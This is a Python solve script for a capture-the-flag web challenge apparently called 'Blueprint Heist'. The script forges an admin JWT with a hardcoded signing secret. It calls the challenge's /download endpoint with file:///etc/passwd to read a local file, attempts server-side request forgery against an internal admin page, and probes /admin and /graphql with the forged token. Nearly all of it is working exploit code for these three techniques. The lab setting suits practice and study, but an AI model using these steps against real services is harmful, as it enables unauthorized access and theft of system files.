import json, hmac, hashlib, base64, urllib.parse, urllib.request, urllib.error, pathlib

base = "http://154.57.164.68:31206"
ev = pathlib.Path(r"D:\download\CTFTimeWriteup\HTB-TryOut\web\Blueprint Heist\solve\evidence")
SECRET = "IM_Sup3r_K3y_pl3ase_b3_c4r3ful?"


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def jwt_role(role: str) -> str:
    header = b64url(b'{"alg":"HS256","typ":"JWT"}')
    payload = b64url(json.dumps({"role": role}, separators=(",", ":")).encode())
    sig = hmac.new(SECRET.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest()
    return f"{header}.{payload}.{b64url(sig)}"


def http(url, data=None, timeout=45):
    req = urllib.request.Request(url, data=data, method="POST" if data else "GET")
    if data:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def download(token, url, timeout=45):
    body = urllib.parse.urlencode({"url": url}).encode()
    return http(f"{base}/download?token={urllib.parse.quote(token, safe='')}", body, timeout)


code, tok = http(base + "/getToken")
user = tok.decode().strip()
admin = jwt_role("admin")
print(f"Q: getToken? |+ status={code} len={len(user)} | -")

# 1) file:// LFI
st, body = download(user, "file:///etc/passwd")
(ev / "dbg_file_passwd.bin").write_bytes(body[:2000])
print(f"Q: download file:///etc/passwd? |+ status={st} len={len(body)} magic={body[:8]!r} | -")

# 2) SSRF admin without internal -> should 403 HTML in PDF
st, body = download(user, f"http://127.0.0.1:1337/admin?token={admin}")
(ev / "dbg_ssrf_admin.bin").write_bytes(body[:2000])
print(f"Q: SSRF /admin as localhost? |+ status={st} len={len(body)} magic={body[:20]!r} | -")

# 3) direct admin from us
st, body = http(f"{base}/admin?token={urllib.parse.quote(admin)}")
print(f"Q: external /admin forged JWT? |+ status={st} body={body[:120]!r} | -")

# 4) graphql GET from us (expect 403)
q = urllib.parse.quote("{getAllData{name}}")
st, body = http(f"{base}/graphql?token={urllib.parse.quote(admin)}&query={q}")
print(f"Q: external graphql admin? |+ status={st} body={body[:160]!r} | -")
